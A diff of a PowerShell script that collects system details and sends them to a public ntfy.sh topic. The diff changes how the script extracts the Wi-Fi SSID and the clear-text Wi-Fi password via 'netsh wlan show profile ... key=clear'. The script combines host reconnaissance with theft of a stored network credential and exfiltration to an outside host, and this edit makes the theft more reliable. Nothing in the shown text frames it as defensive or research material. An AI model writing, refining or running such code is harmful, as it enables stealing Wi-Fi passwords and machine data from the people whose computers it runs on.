@@ -21,12 +21,16 @@ $bios = (Get-CimInstance Win32_BIOS).SMBIOSBIOSVersion
 # Get primary disk size
 $diskSize = [math]::round((Get-CimInstance Win32_LogicalDisk | Where-Object { $_.DeviceID -eq "C:" }).Size / 1GB, 2)
 
-# Get network profile and Wi-Fi key (SSID and passphrase)
+# Get network profile name (SSID)
 $networkProfile = (Get-NetConnectionProfile).Name
-$wifiKeyInfo = netsh wlan show profile name=$networkProfile key=clear | Where-Object {$_ -match 'SSID|Key Content'} | ForEach-Object {($_ -split ':')[1].Trim()}
+
+# Get Wi-Fi SSID and key (password) from the network profile
+$wifiInfo = netsh wlan show profile name=$networkProfile key=clear
+$ssid = ($wifiInfo | Select-String 'SSID name' | ForEach-Object { ($_ -split ': ')[1].Trim() })[0]
+$wifiKey = ($wifiInfo | Select-String 'Key Content' | ForEach-Object { ($_ -split ': ')[1].Trim() })[0]
 
 # Create the message to send
-$message = "Host: $hostname`nIP: $ipAddress`nOS: $osVersion`nCPU: $cpu`nMemory: $memory GB`nBIOS: $bios`nDisk Size: $diskSize GB`nWi-Fi SSID: $($wifiKeyInfo[0])`nWi-Fi Key: $($wifiKeyInfo[1])"
+$message = "Host: $hostname`nIP: $ipAddress`nOS: $osVersion`nCPU: $cpu`nMemory: $memory GB`nBIOS: $bios`nDisk Size: $diskSize GB`nWi-Fi SSID: $ssid`nWi-Fi Key: $wifiKey"
 
 # Send the message to ntfy
 $url = 'https://ntfy.sh/' + $topic
